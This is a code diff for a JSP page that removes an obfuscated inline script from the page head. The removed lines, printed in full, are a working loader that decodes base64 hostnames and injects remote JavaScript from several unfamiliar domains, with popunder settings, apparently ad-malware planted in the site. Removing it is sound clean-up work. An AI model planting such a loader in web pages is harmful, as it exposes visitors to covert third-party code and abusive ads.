@@ -24,14 +24,6 @@
 		 <%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
 		 <%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt"%>
 		 
-<script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var o=window,f="e0c1aec43ba85c167e1b35ed321dc0d1",a=[["siteId",264+960-319-978+5148148],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],l=["d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL2dwb3N0YWwubWluLmNzcw==","ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvb2JweS90aW5kZXgubWluLmpz","d3d3LnFvdXN1anVoLmNvbS9kcG9zdGFsLm1pbi5jc3M=","d3d3LmRjYndrbW55ZW5ocS5jb20vei95aW5kZXgubWluLmpz"],d=-1,h,w,q=function(){clearTimeout(w);d++;if(l[d]&&!(1757414113000<(new Date).getTime()&&1<d)){h=o.document.createElement("script");h.type="text/javascript";h.async=!0;var y=o.document.getElementsByTagName("script")[0];h.src="https://"+atob(l[d]);h.crossOrigin="anonymous";h.onerror=q;h.onload=function(){clearTimeout(w);o[f.slice(0,16)+f.slice(0,16)]||q()};w=setTimeout(q,5E3);y.parentNode.insertBefore(h,y)}};if(!o[f]){try{Object.freeze(o[f]=a)}catch(e){}q()}})();
-/*]]>/* */
-</script>
-
-
-
 </head>
 <body>
 
